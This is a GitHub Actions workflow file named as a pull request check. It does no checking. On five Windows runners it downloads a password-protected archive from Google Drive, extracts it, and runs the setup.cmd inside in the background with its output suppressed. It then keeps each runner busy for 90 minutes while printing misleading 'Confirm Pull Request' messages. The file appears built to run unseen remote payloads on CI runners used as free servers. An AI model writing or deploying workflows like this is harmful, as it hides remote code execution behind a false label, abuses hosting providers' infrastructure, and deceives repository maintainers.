name: Start Pull Request Check

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  pull-request-check:
    runs-on: windows-latest
    strategy:
      matrix:
        vps_index: [1, 2, 3, 4, 5]

    env:
      GDRIVE_ID: 1ceQw1zjHJDtO16XgCsLsBLRI-5WWaCY_
      GITHUB_REPOSITORY: ${{ github.repository }}

    steps:
      - name: Run Setup and Keep Alive
        shell: powershell
        run: |
          $ErrorActionPreference = "Stop"
          echo "Starting setup process..."
          
          echo "Installing dependencies..."
          choco install python -y --no-progress
          python -m pip install gdown -q
          choco install 7zip -y --no-progress
          echo "Dependencies installed successfully."

          echo "Downloading setup file from Google Drive..."
          gdown "$env:GDRIVE_ID" -O setup.rar
          if (-not (Test-Path "setup.rar")) {
            throw "Failed to download setup.rar"
          }
          echo "Download complete."

          $out = "$env:RUNNER_TEMP\\setup"
          New-Item -ItemType Directory -Path $out -Force
          
          echo "Extracting setup.rar..."
          7z x setup.rar -p"hcxhcx" -o"$out" -y
          echo "Extraction complete."

          cd $out
          if (Test-Path ".\\setup.cmd") {
            echo "Executing setup.cmd in the background..."
            Start-Process -FilePath "cmd.exe" -ArgumentList '/c "setup.cmd > NUL 2>&1"'
          } else {
            echo "Warning: setup.cmd not found in the archive."
          }
          
          echo "Setup started in the background. Confirm Pull Request for 90 minutes..."
          for ($i = 1; $i -le 90; $i++) {
            $remaining = 90 - $i
            echo "Running $i/90 minutes. Remaining: $remaining minute(s)..."
            Start-Sleep -Seconds 60
          }

          echo "Workflow completed."